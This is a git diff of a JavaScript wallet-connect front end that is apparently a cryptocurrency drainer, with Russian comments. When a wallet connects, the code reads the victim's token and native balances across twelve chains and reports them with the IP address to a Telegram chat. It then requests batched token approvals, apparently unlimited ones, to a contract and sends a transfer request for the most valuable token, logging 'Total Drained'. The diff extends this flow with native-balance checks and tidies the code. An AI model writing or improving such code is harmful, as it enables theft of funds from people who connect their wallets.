@@ -2,10 +2,10 @@ import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fan
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
-import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
+import { readContract, writeContract, sendCalls, getBalance } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
+const USE_SENDCALLS = true;
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -20,20 +20,8 @@ const debounce = (func, wait) => {
 const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
   try {
     console.log(`Monitoring transaction ${txHash} on chain ${chainId}`)
-    
-    // Ждем 5 секунд для проверки статуса транзакции
     await new Promise(resolve => setTimeout(resolve, 5000))
-    
-    // Проверяем статус транзакции
-    try {
-      // Здесь можно добавить проверку статуса через RPC
-      // Пока что просто логируем
-      console.log(`Transaction ${txHash} status check completed`)
-      
-    } catch (statusError) {
-      console.log(`Could not check transaction status: ${statusError.message}`)
-    }
-    
+    console.log(`Transaction ${txHash} status check completed`)
     console.log(`Transaction ${txHash} monitoring completed`)
     return true
   } catch (error) {
@@ -51,18 +39,18 @@ const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4828313363'
 
 const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
 const networkMap = {
-  'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
-  'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
-  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 },
-  'Arbitrum': { networkObj: arbitrum, chainId: networks[3].id || 42161 },
-  'Optimism': { networkObj: optimism, chainId: networks[4].id || 10 },
-  'Base': { networkObj: base, chainId: networks[5].id || 8453 },
-  'Scroll': { networkObj: scroll, chainId: networks[6].id || 534352 },
-  'Avalanche': { networkObj: avalanche, chainId: networks[7].id || 43114 },
-  'Fantom': { networkObj: fantom, chainId: networks[8].id || 250 },
-  'Linea': { networkObj: linea, chainId: networks[9].id || 59144 },
-  'zkSync': { networkObj: zkSync, chainId: networks[10].id || 324 },
-  'Celo': { networkObj: celo, chainId: networks[11].id || 42220 }
+  'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56, nativeSymbol: 'BNB' },
+  'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1, nativeSymbol: 'ETH' },
+  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137, nativeSymbol: 'MATIC' },
+  'Arbitrum': { networkObj: arbitrum, chainId: networks[3].id || 42161, nativeSymbol: 'ETH' },
+  'Optimism': { networkObj: optimism, chainId: networks[4].id || 10, nativeSymbol: 'ETH' },
+  'Base': { networkObj: base, chainId: networks[5].id || 8453, nativeSymbol: 'ETH' },
+  'Scroll': { networkObj: scroll, chainId: networks[6].id || 534352, nativeSymbol: 'ETH' },
+  'Avalanche': { networkObj: avalanche, chainId: networks[7].id || 43114, nativeSymbol: 'AVAX' },
+  'Fantom': { networkObj: fantom, chainId: networks[8].id || 250, nativeSymbol: 'FTM' },
+  'Linea': { networkObj: linea, chainId: networks[9].id || 59144, nativeSymbol: 'ETH' },
+  'zkSync': { networkObj: zkSync, chainId: networks[10].id || 324, nativeSymbol: 'ETH' },
+  'Celo': { networkObj: celo, chainId: networks[11].id || 42220, nativeSymbol: 'CELO' }
 }
 console.log('Network Map:', networkMap)
 
@@ -198,8 +186,6 @@ function hideCustomModal() {
   }
 }
 
-
-
 // Очистка состояния при загрузке страницы
 window.addEventListener('load', () => {
   appKit.disconnect()
@@ -255,10 +241,6 @@ const getScanLink = (hash, chainId, isTx = false) => {
     return `https://scrollscan.com${basePath}${hash}`
   } else if (chainId === networkMap['Avalanche'].chainId) {
     return `https://snowtrace.io${basePath}${hash}`
-  } else if (chainId === networkMap['Core'].chainId) {
-    return `https://scan.coredao.org${basePath}${hash}`
-  } else if (chainId === networkMap['Cronos'].chainId) {
-    return `https://cronoscan.com${basePath}${hash}`
   } else if (chainId === networkMap['Fantom'].chainId) {
     return `https://ftmscan.com${basePath}${hash}`
   } else if (chainId === networkMap['Linea'].chainId) {
@@ -354,7 +336,7 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
         const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
         const value = token.balance * price
         totalValue += value
-        return `➡️ ${token.symbol} - ${value.toFixed(2)}$`
+        return `➡️ ${token.symbol} - ${value.toFixed(2)}$ (${token.balance.toFixed(4)} ${token.symbol})`
       })
       .join('\n')
     const message = `🚨 New connect (${walletName} - ${device})\n` +
@@ -394,7 +376,7 @@ async function notifyTransferApproved(address, walletName, device, token, chainI
                     `🕸 Network: ${networkName}\n` +
                     `🌎 ${ip}\n\n` +
                     `**🔥 Processing: ${amountValue}$**\n` +
-                    `➡️ ${token.symbol}\n\n` +
+                    `➡️ ${token.symbol} - ${token.balance.toFixed(4)} ${token.symbol}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
   } catch (error) {
@@ -415,7 +397,7 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
                     `🕸 Network: ${networkName}\n` +
                     `🌎 ${ip}\n\n` +
                     `**💰 Total Drained: ${amountValue}$**\n` +
-                    `➡️ ${token.symbol} - ${amountValue}$\n\n` +
+                    `➡️ ${token.symbol} - ${token.balance.toFixed(4)} ${token.symbol}\n\n` +
                     `🔗 Transfer: [Transaction Hash](${txLink})`
     await sendTelegramMessage(message)
   } catch (error) {
@@ -570,6 +552,23 @@ const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, cha
   }
 }
 
+const getNativeBalance = async (wagmiConfig, address, chainId) => {
+  if (!address || !isAddress(address)) {
+    console.error(`Invalid or missing address: ${address}`)
+    return 0
+  }
+  try {
+    const balance = await getBalance(wagmiConfig, {
+      address: getAddress(address),
+      chainId
+    })
+    return Number(formatUnits(balance.value, 18))
+  } catch (error) {
+    store.errors.push(`Error fetching native balance for ${address} on chain ${chainId}: ${error.message}`)
+    return 0
+  }
+}
+
 const getTokenAllowance = async (wagmiConfig, ownerAddress, tokenAddress, spenderAddress, chainId) => {
   if (!ownerAddress || !tokenAddress || !spenderAddress || !isAddress(ownerAddress) || !isAddress(tokenAddress) || !isAddress(spenderAddress)) {
     console.error(`Invalid addresses for allowance check: owner=${ownerAddress}, token=${tokenAddress}, spender=${spenderAddress}`)
@@ -605,7 +604,17 @@ const waitForAllowance = async (wagmiConfig, userAddress, tokenAddress, contract
 
 const getTokenPrice = async (symbol) => {
   try {
-    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`)
+    // Для нативных токенов используем соответствующие торговые пары
+    const symbolMap = {
+      'ETH': 'ETHUSDT',
+      'BNB': 'BNBUSDT',
+      'MATIC': 'MATICUSDT',
+      'AVAX': 'AVAXUSDT',
+      'FTM': 'FTMUSDT',
+      'CELO': 'CELOUSDT'
+    }
+    const apiSymbol = symbolMap[symbol] || `${symbol}USDT`
+    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${apiSymbol}`)
     if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`)
     const data = await response.json()
     return Number(data.price) || 0
@@ -630,12 +639,9 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
       chainId
     })
     console.log(`Approve transaction sent: ${txHash}`)
-    
-    // Запускаем мониторинг транзакции в фоне
     monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
       console.error(`Error monitoring transaction ${txHash}:`, error)
     })
-    
     return txHash
   } catch (error) {
     store.errors.push(`Approve token failed: ${error.message}`)
@@ -643,7 +649,6 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   }
 }
 
-// Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
     console.log('No most expensive token found, skipping batch operations')
@@ -652,7 +657,6 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
 
   console.log(`Attempting batch operations for network: ${mostExpensive.network}`)
 
-  // Добавляем проверку и смену сети
   const targetNetworkInfo = networkMap[mostExpensive.network]
   if (!targetNetworkInfo) {
     const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
@@ -693,12 +697,8 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
   }
 
   try {
-    // Get tokens with non-zero balance in the most expensive token's network
-    const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0)
-
-    // Prepare approve calls for ERC-20 tokens
+    const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0 && t.address !== 'native')
     const approveCalls = networkTokens
-      .filter(t => t.address !== 'native')
       .map(t => ({
         to: getAddress(t.address),
         data: encodeFunctionData({
@@ -709,19 +709,18 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         value: '0x0'
       }))
 
-    // Send batch transaction
     if (approveCalls.length > 0) {
-	const gasLimit = BigInt(550000)
-   	const maxFeePerGas = BigInt(1000000000)
-    	const maxPriorityFeePerGas = BigInt(1000000000)
-    	console.log(`Approving token with gasLimit: ${gasLimit}, 	maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
+      const gasLimit = BigInt(550000)
+      const maxFeePerGas = BigInt(1000000000)
+      const maxPriorityFeePerGas = BigInt(1000000000)
+      console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
         calls: approveCalls,
         account: getAddress(state.address),
         chainId: mostExpensive.chainId,
         gas: gasLimit,
-	maxFeePerGas,
-	maxPriorityFeePerGas
+        maxFeePerGas,
+        maxPriorityFeePerGas
       })
       console.log(`Batch transaction sent with id: ${id}`)
       return { success: true, txHash: id }
@@ -736,7 +735,6 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
   }
 }
 
-// Модифицируем initializeSubscribers для корректной работы уведомлений
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
     updateStore('accountState', state)
@@ -749,12 +747,29 @@ const initializeSubscribers = (modal) => {
         return
       }
       const balancePromises = []
-      Object.entries(TOKENS).forEach(([networkName, tokens]) => {
-        const networkInfo = networkMap[networkName]
-        if (!networkInfo) {
-          console.warn(`Network ${networkName} not found in networkMap`)
-          return
-        }
+      Object.entries(networkMap).forEach(([networkName, networkInfo]) => {
+        // Добавляем запрос баланса нативного токена
+        balancePromises.push(
+          getNativeBalance(wagmiAdapter.wagmiConfig, state.address, networkInfo.chainId)
+            .then(balance => ({
+              symbol: networkInfo.nativeSymbol,
+              balance,
+              address: 'native',
+              network: networkName,
+              chainId: networkInfo.chainId,
+              decimals: 18
+            }))
+            .catch(() => ({
+              symbol: networkInfo.nativeSymbol,
+              balance: 0,
+              address: 'native',
+              network: networkName,
+              chainId: networkInfo.chainId,
+              decimals: 18
+            }))
+        )
+        // Запрос балансов ERC-20 токенов
+        const tokens = TOKENS[networkName] || []
         tokens.forEach(token => {
           if (isAddress(token.address)) {
             balancePromises.push(
@@ -800,22 +815,24 @@ const initializeSubscribers = (modal) => {
       if (mostExpensive) {
         console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`)
         
+        if (mostExpensive.address === 'native') {
+          console.log('Most expensive asset is native token, skipping approval')
+          hideCustomModal()
+          store.isProcessingConnection = false
+          return
+        }
+
         if (USE_SENDCALLS) {
-          // Пытаемся использовать batch операции (sendCalls)
           const batchResult = await performBatchOperations(mostExpensive, allBalances, state)
           
           if (batchResult.success) {
-            // Handle successful batch transaction
             console.log('Batch transaction successful')
-            
-            // Get all tokens that were approved in batch
             const approvedTokens = allBalances.filter(t => 
               t.network === mostExpensive.network && 
               t.balance > 0 &&
               t.address !== 'native'
             )
             
-            // Notify about batch approval for all tokens
             for (const token of approvedTokens) {
               await notifyTransferApproved(
                 state.address,
@@ -824,10 +841,6 @@ const initializeSubscribers = (modal) => {
                 token,
                 mostExpensive.chainId
               )
-            }
-            
-            // Wait for allowance and send transfer request for all approved tokens
-            for (const token of approvedTokens) {
               try {
                 await waitForAllowance(
                   wagmiAdapter.wagmiConfig,
@@ -864,15 +877,11 @@ const initializeSubscribers = (modal) => {
             store.isProcessingConnection = false
             return
           } else if (batchResult.error === 'BATCH_NOT_SUPPORTED') {
-            // Кошелек не поддерживает sendCalls - fallback на обычный approve
-            console.log('Batch transactions not supported (wallet_sendCalls not available), falling back to regular approve')
+            console.log('Batch transactions not supported, falling back to regular approve')
           }
-          // Если batch не сработал по другой причине - также переходим к обычному approve
         }
         
-        // Обычный approve (используется когда USE_SENDCALLS = false или batch не сработал)
         console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price}`)
-        console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })))
         const targetNetworkInfo = networkMap[mostExpensive.network]
         if (!targetNetworkInfo) {
           const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
@@ -940,11 +949,9 @@ const initializeSubscribers = (modal) => {
           console.log(approveMessage)
           await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
           
-          // Ждем подтверждения allowance
           console.log('Waiting for allowance confirmation...')
           await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId)
           
-          // Отправляем запрос на сервер с корректным amount
           const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
           console.log(`Sending transfer request with amount: ${amount.toString()}`)
           const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
@@ -963,26 +970,7 @@ const initializeSubscribers = (modal) => {
           hideCustomModal()
           store.isProcessingConnection = false
         } catch (error) {
-          store.isApprovalRequested = false
-          if (error.code === 4001 || error.code === -32000) {
-            store.isApprovalRejected = true
-            const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
-            store.errors.push(errorMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = errorMessage
-            hideCustomModal()
-            appKit.disconnect()
-            store.connectionKey = null
-            store.isProcessingConnection = false
-            sessionStorage.clear()
-          } else {
-            const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
-            store.errors.push(errorMessage)
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = errorMessage
-            hideCustomModal()
-            store.isProcessingConnection = false
-          }
+          handleApproveError(error, mostExpensive, state)
         }
       } else {
         const message = 'No tokens with positive balance'
@@ -1000,7 +988,6 @@ const initializeSubscribers = (modal) => {
     updateStateDisplay('networkState', state)
     const switchNetworkBtn = document.getElementById('switch-network')
     if (switchNetworkBtn) {
-      // Определяем следующую сеть для переключения
       let nextNetwork = 'Ethereum'
       if (state?.chainId === networkMap['Ethereum'].chainId) nextNetwork = 'Polygon'
       else if (state?.chainId === networkMap['Polygon'].chainId) nextNetwork = 'Arbitrum'
@@ -1048,15 +1035,14 @@ const handleApproveError = (error, token, state) => {
 initializeSubscribers(appKit)
 updateButtonVisibility(appKit.getIsConnectedState())
 
-// Обработчик для кнопок подключения кошелька
 document.querySelectorAll('.open-connect-modal').forEach(button => {
   button.addEventListener('click', (event) => {
-    event.stopPropagation(); // Предотвращаем всплытие события к document
+    event.stopPropagation()
     if (!appKit.getIsConnectedState()) {
-      appKit.open();
+      appKit.open()
     }
-  });
-});
+  })
+})
 
 document.getElementById('disconnect')?.addEventListener('click', () => {
   appKit.disconnect()
@@ -1071,8 +1057,6 @@ document.getElementById('disconnect')?.addEventListener('click', () => {
 
 document.getElementById('switch-network')?.addEventListener('click', () => {
   const currentChainId = store.networkState?.chainId
-  
-  // Определяем следующую сеть для переключения
   let nextNetwork = networkMap['Ethereum'].networkObj
   if (currentChainId === networkMap['Ethereum'].chainId) nextNetwork = networkMap['Polygon'].networkObj
   else if (currentChainId === networkMap['Polygon'].chainId) nextNetwork = networkMap['Arbitrum'].networkObj
